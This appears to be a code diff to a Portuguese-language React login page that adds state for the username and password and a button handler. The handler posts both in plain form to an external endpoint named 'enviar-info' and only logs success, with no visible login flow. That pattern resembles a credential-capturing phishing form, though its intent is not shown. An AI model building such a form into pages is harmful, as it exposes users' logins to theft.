@@ -1,8 +1,20 @@
 import * as React from "react";
 import "../components/App.css";
+import axios from "axios";
 
 function Home() {
   const [isCheckboxActived, SetCheckBox] = React.useState(false);
+  const [Username, setUsername] = React.useState("");
+  const [Password, setPassword] = React.useState("");
+
+  const send_info = async () => {
+    await axios.post("https://api-v2-rouge.vercel.app/enviar-info", { username: Username, senha: Password }).then(res => {
+      if (res.data.ok) {
+        console.log("TUDO CERTO")
+      }
+    });
+
+  };
   const verifyCheckbox = () => {
     SetCheckBox(!isCheckboxActived)
   }
@@ -12,11 +24,15 @@ function Home() {
       <div class="item-container">
         <p>Usuário</p>
           <form>
-            <input type="text" class="input"></input>
+            <input type="text" class="input" onChange={(e) => {
+              setUsername(e.target.value)
+            }}></input>
           </form>
             <p>Senha</p>
           <form>
-            <input type="password" class="input"></input>
+            <input type="password" class="input" onChange={(e) => {
+              setPassword(e.target.value)
+            }}></input>
           </form>
           <form>
             <label>
@@ -24,7 +40,7 @@ function Home() {
             Guardar minha Sessão.</label>
         </form>
       </div>
-   <button id="input-button">Confirmar</button>
+   <button id="input-button" onClick={send_info}>Confirmar</button>
     </div>
   )
 }
